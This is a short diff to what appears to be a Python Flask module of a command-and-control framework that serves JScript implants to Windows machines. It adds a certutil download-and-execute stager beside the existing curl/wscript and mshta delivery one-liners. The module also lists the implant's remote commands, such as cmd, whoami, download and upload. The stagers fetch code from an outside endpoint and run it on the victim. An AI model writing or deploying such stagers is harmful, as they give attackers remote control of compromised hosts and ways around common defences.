@@ -8,7 +8,8 @@ jscript = Blueprint('jscript', __name__, template_folder='resources')
 endpoint = digit_identifier()
 artifact = string_identifier()
 delivery = f'curl ~endpoint~ -o {artifact}.js && wscript /e:jscript {artifact}.js\n' \
-           f'mshta ~endpoint~.hta'
+           f'mshta ~endpoint~.hta\n' \
+           f'certutil -urlcache -split -f ~endpoint~ %TEMP%/sgHIHMPJMN.js && wscript /e:jscript %TEMP%/sgHIHMPJMN.js'
 commands = 'delay,dir,hostname,whoami,os,cmd,delfile,download,upload'
 
 @jscript.route(f'/{endpoint}', methods=['GET'])
